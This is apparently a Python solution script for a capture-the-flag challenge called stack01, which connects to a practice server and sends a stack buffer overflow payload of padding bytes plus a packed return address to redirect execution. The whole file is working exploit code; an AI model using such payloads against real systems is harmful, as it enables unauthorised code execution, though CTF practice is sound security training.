import socket
import struct
import time


def stack01():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('pwnable.hso-hacker.space', 20001))

    addressToJump = 0x0000000000400677
    payload = 'A' * 0x48 + struct.pack('<Q', addressToJump).decode() + '\n'
    #print(str(struct.pack('<I', payload)))

    s.send(payload.encode())
    time.sleep(1)
    data = s.recv(1024).decode('utf-8')

    print(data)


if __name__ == '__main__':
    stack01()
